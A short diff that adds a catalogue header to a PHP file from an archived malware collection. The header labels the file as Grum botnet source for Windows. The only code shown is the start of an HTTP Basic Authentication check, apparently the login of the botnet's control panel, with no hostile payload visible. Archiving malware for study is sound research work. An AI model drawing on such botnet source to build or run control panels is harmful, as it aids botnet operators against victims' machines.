@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      Grum
+; type      botnet
+; cve       —
+; year      unknown
+; os        Windows
+; authors   unknown
+; source    RamadhanAmizudin/malware
+; archived  RamadhanAmizudin, krisyotam (2026)
+; notes     —
+; ------------------------------------------------------------
 <?
 if (!isset($_SERVER['PHP_AUTH_USER'])) {
 header("WWW-Authenticate: Basic realm=\"Autorisation\"");
